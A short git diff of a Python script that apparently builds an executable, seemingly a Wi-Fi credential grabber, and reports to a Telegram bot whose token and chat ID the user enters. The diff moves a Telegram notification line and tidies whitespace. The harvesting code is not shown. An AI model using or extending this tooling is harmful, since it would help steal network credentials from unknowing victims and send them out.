@@ -1,11 +1,8 @@
-
 from colorama import Fore,Back,Style
 import subprocess
 import requests
 import sys
 import os
-
-
 
 
 import banner 
@@ -18,10 +15,7 @@ if ask == "yes" or ask == "y":
     BotId = input("Enter your Chat ID: ")
     BotToken = input("Enter your bot token: ")
 
-    # Send Text this is for test
-    msg = "This massage is for test 👇"
-    url = ("https://api.telegram.org/bot"+BotToken+"/sendMessage?chat_id="+BotId+"&text="+msg)
-    req = requests.post(url, data={"chat_id": id, "text": msg})
+    
 
 # create script file    
     def create_script_file():
@@ -84,6 +78,10 @@ wifi()\n""")
         print("Your exe file has been created!")
         
     export_exe()
+    # Send Text this is for test
+    msg = "Your Script is done!"
+    url = ("https://api.telegram.org/bot"+BotToken+"/sendMessage?chat_id="+BotId+"&text="+msg)
+    req = requests.post(url, data={"chat_id": id, "text": msg})
     
 else:
 
@@ -107,5 +105,6 @@ else:
                 print("OK please Wait...")
             else:
                 print("Error: ", req.status_code, req.text)
-        print("Thanks ^_~ ")
+        print("Thanks  ^_~ ")
+
     MyWifi()
